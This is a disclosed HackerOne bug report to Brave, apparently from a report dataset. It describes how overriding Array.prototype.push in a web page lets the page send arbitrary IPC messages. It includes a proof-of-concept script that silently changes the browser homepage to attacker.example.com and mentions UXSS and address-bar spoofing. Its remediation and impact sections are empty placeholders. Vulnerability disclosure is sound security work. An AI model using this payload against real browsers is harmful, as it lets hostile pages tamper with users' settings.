---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '188561'
original_report_id: '188561'
title: Sending arbitrary IPC messages via overriding Array.prototype.push
weakness: Command Injection - Generic
team_handle: brave
created_at: '2016-12-06T01:43:30.507Z'
disclosed_at: '2018-09-18T18:15:36.258Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 6
tags:
- hackerone
- command-injection-generic
---

# Sending arbitrary IPC messages via overriding Array.prototype.push

## Metadata

- HackerOne Report ID: 188561
- Weakness: Command Injection - Generic
- Program: brave
- Disclosed At: 2018-09-18T18:15:36.258Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

## Summary:
This bug is similar to #187542 and #188086.
I found that also `Array.prototype.push` is exploitable.

## Tested on: 
Brave	0.12.12

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change3.html 
```
<script>
Array.prototype.push=function(e){
	this[0]=function(e,f){
		e.sender.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
	}
}
</script>

<embed src=".swf"></embed>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `push` in the `event_emitter.js` is overwritten: 
```
EventEmitter2.prototype.on = function (event, fn) {
  this._callbacks = this._callbacks || {};
  (this._callbacks['$' + event] = this._callbacks['$' + event] || [])
    .push(fn);
  return this;
};
```

Could you confirm this bug?
Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
